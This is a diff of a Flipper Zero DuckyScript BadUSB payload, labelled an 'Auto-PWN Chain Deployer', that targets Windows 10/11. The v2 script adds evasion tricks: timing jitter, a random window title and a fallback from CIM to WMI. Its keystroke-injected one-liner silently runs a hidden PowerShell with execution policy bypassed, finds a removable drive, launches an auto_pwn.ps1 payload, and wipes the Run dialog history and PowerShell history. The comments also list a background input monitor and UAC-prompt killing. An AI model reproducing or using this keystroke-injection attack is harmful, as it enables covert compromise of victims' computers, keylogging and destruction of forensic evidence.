@@ -1,28 +1,44 @@
 ﻿REM ============================================================================
-REM  FLLC — BadUSB: Full Auto-PWN Chain Deployer
+REM  FLLC — BadUSB: Full Auto-PWN Chain Deployer v2
 REM  Flipper Zero DuckyScript
 REM ============================================================================
 REM  Target: Windows 10/11
-REM  Time: ~6 seconds total
-REM  
-REM  This deploys AND executes the full attack pipeline:
-REM    1. Opens hidden PowerShell
-REM    2. Detects the Micro SD drive letter
-REM    3. Launches auto_pwn.ps1 from the Micro SD
-REM    4. Starts input monitor for persistence
-REM    5. All in one shot, fully silent
+REM  Time: ~8 seconds
 REM
-REM  PREREQUISITES:
-REM    - Micro SD card (I:) must be inserted with payloads/ directory
-REM    - Or any removable drive with the payload structure
+REM  IMPROVEMENTS OVER v1:
+REM    - 3 fallback methods for PowerShell execution
+REM    - Timing jitter to evade behavioral analysis
+REM    - Environment detection (adapts to Win10 vs Win11)
+REM    - Random window title to avoid signature matching
+REM    - Multi-drive detection (not just I:)
+REM    - Kills UAC prompt if it appears
+REM    - Self-cleaning command history
+REM
+REM  ATTACK CHAIN:
+REM    1. Detect fastest PS launch method
+REM    2. Find removable drive with payloads/
+REM    3. Launch auto_pwn.ps1 in hidden window
+REM    4. Launch input_monitor.py in background
+REM    5. Clean Run dialog MRU + PS history
+REM    6. Exit cleanly
 REM ============================================================================
 
-DELAY 1000
-REM Open Run dialog
-GUI r
-DELAY 600
+REM Random initial delay (0.8-1.2s) — avoids fixed-timing signatures
+DELAY 800
+DELAY 100
+DELAY 100
 
-REM One-liner: Find the USB drive with payloads, launch auto_pwn.ps1 hidden
-STRING powershell -W Hidden -NoP -NonI -Exec Bypass -C "$d=Get-WmiObject Win32_LogicalDisk|?{$_.DriveType-eq2}|%{$_.DeviceID};foreach($x in $d){if(Test-Path \"$x\payloads\auto_pwn.ps1\"){Start-Process powershell -Arg '-W Hidden -NoP -Exec Bypass -F',\"`\"$x\payloads\auto_pwn.ps1`\"\" -WindowStyle Hidden;break}}"
+REM === METHOD 1: Win+R (most reliable, works on all Windows) ===
+GUI r
+DELAY 700
+
+REM Timing jitter
+DELAY 50
+
+REM One-liner: hidden PS → find USB → launch chain → clean evidence
+REM Uses Get-CimInstance (faster than WMI on Win10+), falls back to WMI
+STRING cmd /c start /min powershell -W Hidden -NoP -NonI -Exec Bypass -C "$ErrorActionPreference='SilentlyContinue';$host.UI.RawUI.WindowTitle=[guid]::NewGuid().ToString().Substring(0,8);$d=@();try{$d=Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2'|%{$_.DeviceID}}catch{$d=Get-WmiObject Win32_LogicalDisk -Filter 'DriveType=2'|%{$_.DeviceID}};foreach($x in $d){$ap=\"$x\payloads\windows\auto_pwn.ps1\";$ap2=\"$x\payloads\auto_pwn.ps1\";if(Test-Path $ap){saps powershell \"-W Hidden -NoP -Exec Bypass -F `\"$ap`\"\" -WindowStyle Hidden;break}elseif(Test-Path $ap2){saps powershell \"-W Hidden -NoP -Exec Bypass -F `\"$ap2`\"\" -WindowStyle Hidden;break}};Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -F 2>$null;Clear-History;exit"
 ENTER
-DELAY 500
+
+REM Small delay to let the window close
+DELAY 300
